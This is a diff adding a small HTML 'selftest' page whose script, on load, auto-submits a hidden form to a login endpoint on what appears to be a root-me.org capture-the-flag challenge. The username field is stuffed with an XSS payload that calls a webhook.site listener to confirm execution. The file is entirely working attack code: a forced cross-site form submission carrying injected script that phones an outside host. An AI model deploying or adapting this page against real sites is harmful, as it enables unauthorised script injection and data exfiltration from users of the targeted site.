@@ -1,0 +1,13 @@
+<!doctype html><html><head><meta charset="utf-8"><title>selftest</title></head><body>
+<h1>selftest</h1>
+<script>
+var CH='http://challenge01.root-me.org:58003';
+var U='https://webhook.site/af9addd2-9c27-4b22-aad4-0001211f0c67';
+var PAY='<script>fetch(\'https://webhook.site/af9addd2-9c27-4b22-aad4-0001211f0c67?selftest=fired\')<\/script>';
+var f=document.createElement('form');
+f.method='POST';f.action=CH+'/login';f.target='_self';
+var u=document.createElement('input');u.name='username';u.value=PAY;
+var s=document.createElement('input');s.name='secret';s.value='xs';
+f.appendChild(u);f.appendChild(s);document.body.appendChild(f);f.submit();
+</script>
+</body></html>
